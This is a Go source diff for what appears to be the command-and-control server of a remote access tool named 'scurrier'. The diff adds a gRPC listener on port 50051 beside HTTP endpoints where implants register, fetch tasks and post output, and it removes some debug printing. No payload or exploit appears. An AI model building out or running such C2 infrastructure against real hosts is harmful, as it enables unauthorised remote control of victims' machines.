@@ -7,6 +7,9 @@ import (
 	"scurrier/config"
 	"scurrier/utils"
 	"scurrier/types"
+	"google.golang.org/grpc"
+      pb "scurrier/rat/modules/pb" // adjust path to your generated pb files
+
 	"errors"
 	
 )
@@ -34,11 +37,31 @@ const (
 
 
 func RunServer(server *Server) {
+
+	go func() {
+                lis, err := net.Listen("tcp", ":50051")
+                if err != nil {
+                        log.Fatalf("failed to listen: %v", err)
+                }
+
+                s := grpc.NewServer()
+
+
+                pb.RegisterMyServiceServer(s, server)
+
+                log.Println("gRPC server listening on :50051")
+                if err := s.Serve(lis); err != nil {
+                        log.Fatalf("failed to serve: %v", err)
+                }
+        }()
+
+
 	router := gin.Default()
 
 	router.POST(server.Config.Endpoints["RegisterEndpoint"], server.RegisterEndpoint)
 	router.GET(server.Config.Endpoints["getTaskEndpoint"], server.GetTaskEndpoint)
 	router.POST(server.Config.Endpoints["postOutputEndpoint"], server.PostOutputEndpoint)
+	//router.GET(server.Config.Endpoints["WebSocketEndpoint"], server.webSocketEndpoint)
 	router.Run(":" + server.Config.Port)
 }
 
@@ -109,11 +132,6 @@ func (s *Server) GetTaskEndpoint(c *gin.Context) {
 		res := utils.CraftErrorResponse(ERROR_SERVER_ERROR)
 		c.Data(503, "application/octet-stream", res)
 	}
-	fmt.Printf("Sending %d-Bytes\n", len(commandBytes))
-	fmt.Printf("\n\n\n")
-	fmt.Println(commandBytes)
-	fmt.Printf("\n\n\n")
-	
 	c.Data(200, "application/octet-stream", commandBytes)
 	return
 
